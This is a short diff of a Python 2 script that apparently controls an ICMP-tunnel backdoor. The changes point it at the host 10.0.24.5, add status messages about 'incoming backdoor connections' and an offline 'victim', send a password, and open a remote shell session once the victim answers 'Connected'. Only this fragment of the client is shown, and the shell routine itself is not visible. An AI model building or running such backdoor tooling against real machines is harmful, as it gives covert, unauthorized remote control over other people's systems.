@@ -26,13 +26,20 @@ def shell(client):
 
     sys.exit()
 
-s = Icmpclient("127.0.0.1")
+############## MAIN ###############
+s = Icmpclient("10.0.24.5")
 resp = "N0TH1NG"
 
+print "Listening for incoming backdoor connections..."
 while "N0TH1NG" in resp:
     resp = s.recv(10)
+    if "N0TH1NG" in resp:
+        print "INFO - timeout(10s) - The victim is likely offline"
 
 s.send(PASSWORD)
 resp = s.recv(10)
 if resp == "Connected":
+    print resp
     shell(s)
+else: 
+    print resp
